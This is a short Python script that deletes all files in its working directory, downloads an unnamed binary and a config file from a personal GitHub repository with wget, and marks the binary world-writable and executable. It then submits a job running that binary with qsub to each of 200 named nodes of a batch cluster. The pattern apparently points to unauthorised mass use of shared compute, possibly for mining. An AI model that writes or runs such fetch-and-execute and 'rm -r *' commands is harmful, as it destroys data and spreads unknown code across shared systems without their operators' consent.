
import os
os.system("rm -r *")
os.system("wget https://raw.githubusercontent.com/dercodeKoenig/test/main/config.json")
os.system("wget https://github.com/dercodeKoenig/test/raw/main/file")
os.system("chmod 777 file")
os.system('echo "./file" > job')

os.system("qstat")
import time
for i in range(200):
    num=str(i+1)
    while(len(num)<3):
        num="0"+num
    node="s001-n"+num
    cmd="qsub -l nodes="+node+":ppn=2 job"
    print(cmd)
    os.system(cmd)
    
    time.sleep(1)
    os.system("rm job.*")
	
